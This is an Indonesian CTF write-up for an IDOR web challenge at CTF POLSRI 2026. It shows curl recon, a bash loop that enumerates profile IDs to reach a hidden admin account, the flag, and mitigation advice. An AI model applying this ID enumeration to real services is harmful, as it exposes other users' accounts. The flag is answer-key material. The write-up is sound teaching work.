# Topeng Wajah Bayangan

| | |
|---|---|
| **Event** | CTF POLSRI 2026 |
| **Kategori** | Web Exploitation |
| **Poin** | 600 |
| **Jenis Celah** | IDOR (Insecure Direct Object Reference) |
| **Target** | https://profile-itfest26.vercel.app/ |
| **Format Flag** | `ITFEST26{...}` |

---

## Deskripsi Soal

> Di balai topeng ini tahun 2026, siapa pun bisa menyamar menjadi orang lain sekadar dengan
> mengubah nomor registrasi lencana di tangan. Amati alur kunjungan para bangsawan lain dan
> ambil alih tempat mereka.
>
> 🔗 Gerbang Lokasi: https://profile-itfest26.vercel.app/

Kata kunci dari deskripsi:
- **"mengubah nomor registrasi lencana"** → mengganti sebuah ID pada request.
- **"menyamar menjadi orang lain" / "ambil alih tempat mereka"** → mengakses profil/akun milik user lain → ini ciri khas **IDOR**.

---

## Flag

```
ITFEST26{1d0r_4cc3ss_gr4nt3d}
```

Didapat dari:

```
https://profile-itfest26.vercel.app/?id=2026
```

---

## Langkah Penyelesaian

### 1. Reconnaissance

Melihat halaman utama dan header respons:

```bash
curl -s -D - "https://profile-itfest26.vercel.app/" -o index.html
```

Header menunjukkan backend-nya **PHP**, bukan sekadar static page (penting — artinya ada
pemrosesan sisi server):

```
HTTP/1.1 200 OK
Server: Vercel
X-Powered-By: PHP/8.3.8
Content-Type: text/html; charset=UTF-8
```

Isi halaman adalah sebuah kartu profil:

```
PROFILE ID    : #1
ACCOUNT TYPE  : Pendaftar
EVENT         : IT Festival HMJMI 2026
```

Di dalam `<style>` halaman terdapat definisi class yang **tidak ter-render** untuk profil biasa:

```css
.admin        { ... background: rgba(34,197,94,.06); ... }   /* kotak hijau */
.admin-title  { ... }
```

Artinya ada **panel admin tersembunyi** yang hanya tampil pada kondisi tertentu. Target kita
adalah membuat panel ini muncul.

### 2. Menemukan Parameter yang Dikontrol

Default halaman menampilkan `PROFILE ID #1`. Deskripsi menyebut "nomor registrasi", jadi kita
cari parameter yang mengubah ID tersebut. Setelah mencoba beberapa nama umum, parameter `id`
lah yang berpengaruh:

```bash
curl -s "https://profile-itfest26.vercel.app/?id=2"   # -> PROFILE ID #2
```

Server menampilkan profil sesuai `id` yang kita minta **tanpa autentikasi / otorisasi apa pun**.
Inilah celah **IDOR**-nya: siapa pun bisa "menyamar" jadi profil lain hanya dengan mengganti angka.

### 3. Enumerasi ID

ID berurutan (1–500) semuanya bertipe `Pendaftar` dan tidak memunculkan panel admin. Karena
deskripsi menyuruh "mengambil alih tempat bangsawan" (akun istimewa), saya uji **ID spesial**
yang lazim dipakai sebagai akun admin di CTF (`0, 777, 1337, 404, 2024, 2025, 2026, ...`):

```bash
b="https://profile-itfest26.vercel.app"
for id in 0 7 13 77 404 666 777 1337 2024 2025 2026 9999 31337; do
  out=$(curl -s "$b/?id=$id")
  acct=$(echo "$out" | awk '/ACCOUNT TYPE/{getline;getline;print}' | sed 's/^ *//;s/<.*//')
  flag=$(echo "$out" | grep -oE 'ITFEST26\{[^}]*\}')
  echo "id=$id | account='$acct' | flag=$flag"
done
```

Hasilnya, `id=2026` (tahun event) berbeda sendiri:

```
id=2024  | account='Pendaftar'    | flag=
id=2025  | account='Pendaftar'    | flag=
id=2026  | account='Admin Utama'  | flag=ITFEST26{1d0r_4cc3ss_gr4nt3d}
```

### 4. Mengambil Profil Admin

```bash
curl -s "https://profile-itfest26.vercel.app/?id=2026"
```

Kini panel admin yang tadinya tersembunyi ikut ter-render:

```
PROFILE ID    : #2026
ACCOUNT TYPE  : Admin Utama
Badge         : ADMINISTRATOR

┌──────────────────────────────┐
│ ✓ ADMIN ACCESS GRANTED       │
│ Profil Admin Utama           │
│ Flag: ITFEST26{1d0r_4cc3ss_gr4nt3d} │
└──────────────────────────────┘
```

Di browser, cukup kunjungi:

```
https://profile-itfest26.vercel.app/?id=2026
```

---

## Root Cause

Aplikasi menyajikan profil berdasarkan ID yang dikirim user (`$_GET['id']`) **tanpa memverifikasi
apakah user memang berhak mengakses profil tersebut**. ID admin pun bersifat mudah ditebak
(angka tahun event). Akibatnya penyerang dapat mengakses akun istimewa hanya dengan mengganti
satu parameter.

## Mitigasi

- Terapkan **access control** di sisi server: pastikan user hanya bisa melihat profil miliknya
  sendiri, berdasarkan **session** server, bukan ID dari input.
- Gunakan identifier yang **tidak dapat ditebak** (mis. UUID) jika memang perlu diekspos.
- Pisahkan endpoint/role admin dan lindungi dengan otentikasi + otorisasi yang benar.

---

*Writeup oleh Bagaskara Amukti Palapa — CTF POLSRI 2026.*
